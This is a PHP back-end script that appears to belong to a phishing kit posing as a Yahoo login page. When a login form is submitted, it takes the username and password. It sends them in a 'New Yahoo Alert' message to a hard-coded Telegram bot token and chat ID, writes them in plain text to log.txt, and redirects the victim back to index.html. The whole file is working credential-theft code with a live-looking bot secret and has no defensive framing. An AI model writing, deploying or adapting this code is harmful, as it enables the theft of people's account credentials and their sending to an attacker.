<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Bot Token 🔑
    $chat_id = "1559369377"; // Chat ID 🔑

    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $message = "🔥 New Yahoo Alert 🔥\n\n<b>Username:</b> $username\n<b>Password:</b> $password";

    $url = "https://api.telegram.org/bot$token/sendMessage";

    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'ignore_errors' => true
        ]
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);

    file_put_contents("log.txt", "Username: $username | Password: $password\n", FILE_APPEND);

    header("Location: index.html");
    exit();
}
?>
